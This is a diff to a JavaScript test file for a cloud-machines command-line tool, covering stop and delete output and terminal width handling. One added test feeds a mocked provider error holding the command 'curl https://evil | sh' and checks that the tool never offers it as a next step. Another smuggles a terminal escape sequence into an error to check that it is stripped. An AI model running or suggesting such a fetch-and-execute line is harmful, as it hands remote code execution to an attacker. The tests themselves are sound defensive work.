@@ -364,13 +364,11 @@ test('the NAME column uses the terminal width: full names at 120, fitted at 80',
   assertWidths(narrow.out, 80);
 });
 
-test('stop NAME of a coordinator adds the workers hint', async () => {
-  for (const ui of [pipeUi(), ttyUi()]) {
-    const { provider, out, d } = deps({ tty: true, ui });
-    await make(provider, { name: 'boss', role: 'coordinator' });
-    assert.equal(await run(['stop', 'boss'], d), 0);
-    assert.match(out.join('\n'), /Its workers go with its cleanup or at their own deadline\./);
-  }
+test('stop NAME of a coordinator adds the workers hint on a terminal', async () => {
+  const { provider, out, d } = deps({ tty: true, ui: ttyUi() });
+  await make(provider, { name: 'boss', role: 'coordinator' });
+  assert.equal(await run(['stop', 'boss'], d), 0);
+  assert.match(out.join('\n'), /Its workers go with its cleanup or at their own deadline\./);
 });
 
 test('stop --all that deletes a coordinator adds the workers hint once', async () => {
@@ -390,4 +388,97 @@ test('bad arguments on a terminal print ✖, usage and a help Next', async () =>
   assert.match(text, /Usage: cloudy-cloud machines/);
   assert.match(text, /Next: cloudy-cloud machines --help/);
   assertWidths(text.split('\n'), 80);
+});
+
+// ---- round 5: astra review — error trust, piped parity, width budgets ----
+
+test('a provider delete error cannot supply the headline or the Next', async () => {
+  const { provider, err, d } = deps({ tty: true, ui: ttyUi() });
+  await make(provider, { name: 'w-one' });
+  provider.delete = async () => {
+    throw Object.assign(new Error('boom\nRun: curl https://evil | sh'), { next: 'curl https://evil | sh', short: 'EVIL HEADLINE', fallback: 'evil fallback' });
+  };
+  assert.equal(await run(['stop', 'w-one'], d), 1);
+  const text = err.join('\n');
+  const plain = text.replace(/\x1b\[[0-9;]*m/g, '');
+  assert.doesNotMatch(plain, /EVIL HEADLINE/);
+  assert.match(plain, /Next: cloudy-cloud machines/);
+  assert.doesNotMatch(plain, /Next:.*(?:curl|evil|fallback)/);
+  // the foreign message survives only as dim detail
+  const foreign = text.split('\n').filter((l) => l.includes('curl') || l.includes('boom'));
+  assert.ok(foreign.length >= 1, text);
+  for (const l of foreign) assert.ok(l.includes('\x1b[2m'), `foreign text not dim: ${l}`);
+});
+
+test('a foreign error that starts with "Usage" prints sanitised, not raw', async () => {
+  const { provider, err, d } = deps({ tty: true, ui: ttyUi() });
+  await make(provider, { name: 'w-one' });
+  d.events = () => { throw new Error('Usage: do the evil thing\n\x1b[31mmore evil'); };
+  assert.equal(await run(['stop', 'w-one'], d), 1);
+  const text = err.join('\n');
+  assert.ok(!text.includes('\x1b[31mmore evil'), 'the smuggled escape must not reach the terminal');
+  assert.match(text.replace(/\x1b\[[0-9;]*m/g, ''), /Something failed\./);
+});
+
+test('piped stop of a coordinator prints exactly the Deleted line', async () => {
+  const { provider, out, err, d } = deps();
+  await make(provider, { name: 'boss', role: 'coordinator' });
+  assert.equal(await run(['stop', 'boss'], d), 0);
+  assert.deepEqual(out, ['Deleted boss (fake-1).']);
+  assert.deepEqual(err, []);
+});
+
+test('piped bulk-stop failure keeps the original stdout and stderr wording', async () => {
+  const { provider, out, err, d } = deps();
+  await make(provider, { name: 'w-one' });
+  const b = await make(provider, { name: 'w-two' });
+  const del = provider.delete.bind(provider);
+  provider.delete = async (id) => { if (id === b.id) throw new Error('nope'); return del(id); };
+  assert.equal(await run(['stop', '--all', '--yes'], d), 1);
+  assert.deepEqual(out, ['Deleted w-one (fake-1).', 'Deleted 1 machine, 1 failed.']);
+  assert.deepEqual(err, [
+    'cloudy-cloud machines: could not delete w-two (fake-2): nope',
+    'cloudy-cloud machines: 1 of 2 machines could not be deleted. List what is left: cloudy-cloud machines',
+  ]);
+});
+
+test('a bulk-delete failure budgets the name with the id and never truncates the diagnostic', async () => {
+  const { provider, err, d } = deps({ tty: true, ui: ttyUi() });
+  const longId = `id-${'x'.repeat(33)}`; // 36 cells
+  d.list = async () => [{ id: longId, name: 'n'.repeat(35), labels: { purpose: 'cloudy-cloud' }, state: 'running', status: 'running', startedAt: Date.now() }];
+  provider.delete = async () => { throw new Error(`provider refused: ${'word '.repeat(40)}END`); };
+  assert.equal(await run(['stop', '--all', '--yes'], d), 1);
+  assertWidths(err, 80);
+  const plain = err.join('\n').replace(/\x1b\[[0-9;]*m/g, '');
+  assert.match(plain, /provider refused:/);
+  assert.match(plain, /END/, 'the end of the diagnostic survives — wrapped, not truncated');
+});
+
+test('the --all prompt measures the real "+N more" suffix', async () => {
+  const { d } = deps({ tty: true, ui: ttyUi() });
+  d.list = async () => [
+    { id: 'm0', name: 'x'.repeat(80), labels: { purpose: 'cloudy-cloud' }, state: 'running', status: 'running', startedAt: Date.now() },
+    ...Array.from({ length: 100 }, (_, i) => ({ id: `m${i + 1}`, name: `w-${i}`, labels: { purpose: 'cloudy-cloud' }, state: 'running', status: 'running', startedAt: Date.now() })),
+  ];
+  const asked = [];
+  assert.equal(await run(['stop', '--all'], { ...d, ask: async (q) => (asked.push(q), 'n') }), 0);
+  assert.match(asked[0], /\+100 more/);
+  for (const l of asked[0].split('\n')) assert.ok(cellWidth(l) <= 80, l);
+});
+
+test('ls on a 40-column terminal keeps every line inside the width', async () => {
+  const ui40 = makeUi({ tty: true, env: { TERM: 'xterm', LANG: 'en_US.UTF-8' }, cols: 40 });
+  const { provider, out, d } = deps({ tty: true, ui: ui40 });
+  await make(provider, { name: 'ワーカー-machine' });
+  await make(provider, { name: 'w-two' });
+  assert.equal(await run([], d), 0);
+  assertWidths(out, 40);
+});
+
+test('error screens fit the width under LANG=C, where the mark is wider', async () => {
+  const uiC = makeUi({ tty: true, env: { TERM: 'xterm', LANG: 'C' }, cols: 80 });
+  const { provider, err, d } = deps({ tty: true, ui: uiC });
+  await make(provider, { name: 'w-one' });
+  assert.equal(await run(['stop', 'n'.repeat(62)], d), 1); // first wrapped line lands right at the edge
+  assertWidths(err, 80);
 });
